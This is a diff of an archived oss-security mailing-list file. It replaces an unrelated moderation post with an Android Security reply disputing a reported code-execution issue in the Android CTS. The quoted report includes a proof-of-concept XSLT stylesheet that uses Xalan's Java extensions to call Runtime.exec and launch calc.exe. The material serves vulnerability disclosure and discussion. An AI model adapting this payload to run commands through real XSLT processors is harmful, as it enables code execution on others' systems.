@@ -1,44 +1,88 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/27/20
-Message-ID: <20141127151918.GA2837@openwall.com>
-Date: Thu, 27 Nov 2014 18:19:18 +0300
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/19/3
+Message-ID: <CAFJ0LnFeEFF8uFvpLBu1v7SgFO2jatRb0zEtka3KnPxeYcuneA@mail.gmail.com>
+Date: Sun, 19 Oct 2014 05:20:50 -0700
+From: Nick Kralevich <nnk@...gle.com>
 To: oss-security@...ts.openwall.com
-Subject: CC'ing external lists/bugs (Re: Bug#771125: Info received (CVE request: mutt: heap-based buffer overflow in mutt_substrdup()))
+Cc: fulldisclosure@...lists.org
+Subject: Re: CVE request: remote code execution in Android CTS
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Nov 27, 2014 at 04:15:10AM +0000, Debian Bug Tracking System wrote:
-> Thank you for the additional information you have supplied regarding
-> this Bug report.
-[...]
-> Please do not send mail to owner@...s.debian.org unless you wish
-> to report a problem with the Bug-tracking system.
+Nick from the Android Security team here.
 
-We have this problem when someone CC's a Debian bug on oss-security
-postings.  (But somehow not all the time?  Perhaps the Debian bug
-tracker has some rules for when not to notify of "the additional
-information"?  Or was Reply-To or whatever set differently this time?)
+In the future, please feel free to send these kinds of reports to
+security@...roid.com. Please see
+http://developer.android.com/guide/faq/security.html#issue for contact
+information.
 
-Neither approving nor rejecting these messages feels right.  Rejecting
-currently means a message would be sent to owner@...s.debian.org, and
-also the thread might be broken in mailing list archives.  Doing nothing
-means that a message to that extent would be sent a few days later.
-I can SSH in to the server and manually remove the message from the
-moderation queue to avoid that, but this also feels weird.  Well, or I
-can update the spam filter to catch and drop these before they get to
-the mailing list manager (and hence before moderation) - maybe I should.
+Android's Compatibility Test Suite (CTS) is an executable software
+package intended to be downloaded and run from your computer. Please
+see https://source.android.com/compatibility/cts-intro.html for more
+information.
 
-Besides, any CC's to other lists tend to result in some "noise" being
-sent to oss-security (some messages that would be appropriate for the
-other instance of the thread, but not so much for oss-security).
+The files within the software package are not intended to be modified.
 
-So I am posting this for three reasons:
+If I'm reading your report correctly, you're claiming that an attacker
+who has the ability to locally modify a software package has the
+ability to get code execution. This isn't a security bug. What you're
+describing is another example of
+http://blogs.msdn.com/b/oldnewthing/archive/2007/10/31/5788080.aspx .
+You're on the wrong side of the airtight hatch.
 
-1. To ask that we please cut down on use of CC's to external lists.
+If you are aware of ways to exploit this functionality that doesn't
+involve tricking the user into replacing a file, please feel free to
+contact us at security@...roid.com.
 
-2. To point out and ask about the issue with Debian bugs specifically -
-how do we handle it best going forward?  Any suggestions?
+-- Nick
 
-3. To explain why this undesirable message appeared in here.
+On Sun, Oct 19, 2014 at 2:28 AM, Lord Tuskington <l.tuskington@...il.com> wrote:
+> CTS parses api-coverage.xsl without providing the FEATURE_SECURE_PROCESSING
+> option. See lines 60-67 of
+> cts/tools/cts-api-coverage/src/com/android/cts/apicoverage/HtmlReport.java:
+>
+> InputStream xsl =
+> CtsApiCoverage.class.getResourceAsStream("/api-coverage.xsl");
+> StreamSource xslSource = new StreamSource(xsl);
+> TransformerFactory factory = TransformerFactory.newInstance();
+> Transformer transformer = factory.newTransformer(xslSource);
+>
+> StreamSource xmlSource = new StreamSource(xmlIn);
+> StreamResult result = new StreamResult(out);
+> transformer.transform(xmlSource, result);
+>
+> An attacker who is able to control api-coverage.xsl could inject arbitrary
+> code into it, which would be executed. For example:
+>
+> <xsl:stylesheet version="1.0"
+> xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+> xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
+> xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
+>>
+> <xsl:output method="text"/>
+>     <xsl:template match="/">
+>        <xsl:variable name="Command"><![CDATA[calc.exe]]></xsl:variable>
+>        <xsl:variable name="RT" select="rt:getRuntime()"/>
+>        <xsl:variable name="proc" select="rt:exec($RT, $Command)"/>
+>        <xsl:text>Process: </xsl:text><xsl:value-of select="$proc"/>
+>     </xsl:template>
+> </xsl:stylesheet>
+>
+> Would pop a calc. This crosses a trust boundary because an attacker could
+> provide an XSL stylesheet that, for example, has enhanced visual layout. A
+> person consuming that stylesheet would assume it could not possibly contain
+> arbitrary code that would be executed, as it's just a stylesheet. The XSL
+> extensions to execute code should be disabled by passing
+> FEATURE_SECURE_PROCESSING.
+>
+> Regards
+>
+> Lord Tuskington
+>
+> Chief Financial Pinniped
+>
+> TuskCorp
 
-Alexander
+
+
+-- 
+Nick Kralevich | Android Security | nnk@...gle.com | 650.214.4037
